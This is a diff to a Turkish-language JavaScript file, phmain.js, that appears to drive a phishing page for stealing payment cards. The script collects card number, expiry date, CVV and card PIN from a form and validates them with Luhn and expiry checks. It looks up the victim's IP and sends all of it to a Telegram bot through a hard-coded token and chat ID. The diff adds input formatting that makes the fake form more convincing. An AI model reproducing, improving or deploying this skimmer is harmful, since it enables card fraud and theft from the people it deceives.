@@ -1,10 +1,9 @@
-// phmain.js - TAM ÇALIŞAN VERSİYON
+// phmain.js - TAM ÇALIŞAN (otomatik slash)
 
 const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
 const CHAT_ID = "-1002475411082";
 
-// Slider fonksiyonları
-window.slider1 = { prev: function() { console.log('prev'); } };
+window.slider1 = { prev: function() {} };
 window.closeAlert = function() { 
     var el = document.getElementById('alertDiv');
     if(el) el.style.display = 'none';
@@ -14,7 +13,6 @@ window.uyariKapat = function() {
     if(el) el.style.display = 'none';
 };
 
-// Luhn algoritması
 function luhnKontrol(kartNo) {
     var sum = 0;
     var alternate = false;
@@ -30,7 +28,6 @@ function luhnKontrol(kartNo) {
     return sum % 10 === 0;
 }
 
-// SKT kontrol
 function sktKontrol(skt) {
     if (!skt || skt.length !== 5) return false;
     var ay = parseInt(skt.substring(0,2), 10);
@@ -45,7 +42,6 @@ function sktKontrol(skt) {
     return true;
 }
 
-// IP alma
 function getIP(callback) {
     fetch('https://api.ipify.org?format=json')
         .then(function(res) { return res.json(); })
@@ -53,13 +49,11 @@ function getIP(callback) {
         .catch(function() { callback('Bilinmiyor'); });
 }
 
-// Telegram'a gönder
 function sendToTelegram(message) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
     fetch(url).catch(console.log);
 }
 
-// Kırmızı kaplama göster
 function showAlert(msg) {
     var alertDiv = document.getElementById('alertDiv');
     if (alertDiv) {
@@ -69,29 +63,60 @@ function showAlert(msg) {
     }
 }
 
-// Sayfa yüklendiğinde butonu bağla
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM yüklendi');
+    // SKT alanına otomatik slash
+    var expInput = document.getElementById('exp');
+    if (expInput) {
+        expInput.addEventListener('input', function(e) {
+            var val = this.value.replace(/\D/g, '');
+            if (val.length >= 3) {
+                this.value = val.slice(0, 2) + '/' + val.slice(2, 4);
+            } else {
+                this.value = val;
+            }
+        });
+    }
     
+    // Kart numarası formatlama (boşluk ekle)
+    var kartInput = document.getElementById('customUsername');
+    if (kartInput) {
+        kartInput.addEventListener('input', function(e) {
+            var val = this.value.replace(/\s/g, '').replace(/\D/g, '');
+            var formatted = '';
+            for (var i = 0; i < val.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += val[i];
+            }
+            this.value = formatted;
+        });
+    }
+    
+    // Sadece rakam (CVV ve Şifre)
+    var cvvInput = document.getElementById('cvv');
+    if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 3);
+        });
+    }
+    
+    var sifreInput = document.getElementById('kkpw');
+    if (sifreInput) {
+        sifreInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+    }
+    
+    // Buton
     var btn = document.getElementById('btn-spc');
-    console.log('Buton bulundu:', btn);
-    
     if (btn) {
         btn.onclick = function(e) {
             e.preventDefault();
-            console.log('Butona tıklandı!');
             
             var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
             var skt = document.getElementById('exp').value;
             var cvv = document.getElementById('cvv').value;
             var sifre = document.getElementById('kkpw').value;
             
-            console.log('Kart No:', kartNo);
-            console.log('SKT:', skt);
-            console.log('CVV:', cvv);
-            console.log('Şifre:', sifre);
-            
-            // Doğrulamalar
             if (!kartNo || kartNo.length !== 16) {
                 showAlert('Kart numarası 16 haneli olmalıdır.');
                 return;
@@ -117,7 +142,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
             
-            // Kırmızı kaplamayı gizle
             document.getElementById('alertDiv').style.display = 'none';
             
             getIP(function(ip) {
@@ -127,7 +151,5 @@ document.addEventListener('DOMContentLoaded', function() {
                 window.location.href = 'success.html';
             });
         };
-    } else {
-        console.log('Buton BULUNAMADI! ID kontrol et.');
     }
 });
